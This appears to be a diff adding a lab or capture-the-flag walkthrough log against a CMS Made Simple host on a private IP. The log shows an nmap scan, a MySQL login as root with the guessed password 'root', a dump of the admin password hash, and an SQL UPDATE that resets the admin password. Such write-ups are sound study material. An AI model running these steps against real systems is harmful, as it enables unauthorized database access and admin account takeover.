@@ -1,0 +1,150 @@
+└─$ nmap -sV -A -p 22,80,3306,33060 172.16.85.135
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 00:40 EDT
+Nmap scan report for 172.16.85.135
+Host is up (0.00041s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
+|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
+|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)
+80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
+|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.
+|_http-title: Home - My CMS
+|_http-server-header: Apache/2.4.38 (Debian)
+3306/tcp  open  mysql   MySQL 8.0.19
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.19
+|   Thread ID: 42
+|   Capabilities flags: 65535
+|   Some Capabilities: LongPassword, LongColumnFlag, SupportsTransactions, Speaks41ProtocolOld, Support41Auth, IgnoreSigpipes, FoundRows, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsLoadDataLocal, ConnectWithDatabase, InteractiveClient, ODBCClient, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: u|W\x1B\x07\x17\x04bDbpa@7\x13Aag:'
+|_  Auth Plugin Name: mysql_native_password
+33060/tcp open  mysqlx?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94SVN%I=7%D=5/10%Time=663DA54A%P=x86_64-pc-linux-gnu%
+SF:r(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+#try passwd  'root', it works ...
+172.16.85.135 -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 82
+Server version: 8.0.19 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+[(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| cmsms_db           |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+
+MySQL [(none)]> use cmsms_db
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [cmsms_db]> show tables;
++--------------------------------+
+| Tables_in_cmsms_db             |
++--------------------------------+
+| cms_additional_users           |
+| cms_additional_users_seq       |
+| cms_admin_bookmarks            |
+| cms_admin_bookmarks_seq        |
+| cms_adminlog                   |
+| cms_content                    |
+| cms_content_props              |
+| cms_content_props_seq          |
+| cms_content_seq                |
+| cms_event_handler_seq          |
+| cms_event_handlers             |
+| cms_events                     |
+| cms_events_seq                 |
+| cms_group_perms                |
+| cms_group_perms_seq            |
+| cms_groups                     |
+| cms_groups_seq                 |
+| cms_layout_design_cssassoc     |
+| cms_layout_design_tplassoc     |
+| cms_layout_designs             |
+| cms_layout_stylesheets         |
+| cms_layout_templates           |
+| cms_layout_tpl_addusers        |
+| cms_layout_tpl_categories      |
+| cms_layout_tpl_type            |
+| cms_locks                      |
+| cms_mod_cmsjobmgr              |
+| cms_mod_filepicker_profiles    |
+| cms_module_deps                |
+| cms_module_news                |
+| cms_module_news_categories     |
+| cms_module_news_categories_seq |
+| cms_module_news_fielddefs      |
+| cms_module_news_fieldvals      |
+| cms_module_news_seq            |
+| cms_module_search_index        |
+| cms_module_search_items        |
+| cms_module_search_items_seq    |
+| cms_module_search_words        |
+| cms_module_smarty_plugins      |
+| cms_module_templates           |
+| cms_modules                    |
+| cms_permissions                |
+| cms_permissions_seq            |
+| cms_routes                     |
+| cms_siteprefs                  |
+| cms_user_groups                |
+| cms_userplugins                |
+| cms_userplugins_seq            |
+| cms_userprefs                  |
+| cms_users                      |
+| cms_users_seq                  |
+| cms_version                    |
++--------------------------------+
+53 rows in set (0.004 sec)
+
+MySQL [cmsms_db]> show columns from cms_users;
++---------------+--------------+------+-----+---------+-------+
+| Field         | Type         | Null | Key | Default | Extra |
++---------------+--------------+------+-----+---------+-------+
+| user_id       | int          | NO   | PRI | NULL    |       |
+| username      | varchar(25)  | YES  |     | NULL    |       |
+| password      | varchar(40)  | YES  |     | NULL    |       |
+| admin_access  | tinyint      | YES  |     | NULL    |       |
+| first_name    | varchar(50)  | YES  |     | NULL    |       |
+| last_name     | varchar(50)  | YES  |     | NULL    |       |
+| email         | varchar(255) | YES  |     | NULL    |       |
+| active        | tinyint      | YES  |     | NULL    |       |
+| create_date   | datetime     | YES  |     | NULL    |       |
+| modified_date | datetime     | YES  |     | NULL    |       |
++---------------+--------------+------+-----+---------+-------+
+10 rows in set (0.014 sec)
+
+MySQL [cmsms_db]> select username,password from cms_users;
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| admin    | fb67c6d24e756229aab021cea7605fb3 |
++----------+----------------------------------+
+1 row in set (0.002 sec)
+
+#reset the passwd of admin
+MySQL [cmsms_db]> update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'123'))) where username = 'admin';
+Query OK, 1 row affected (0.010 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
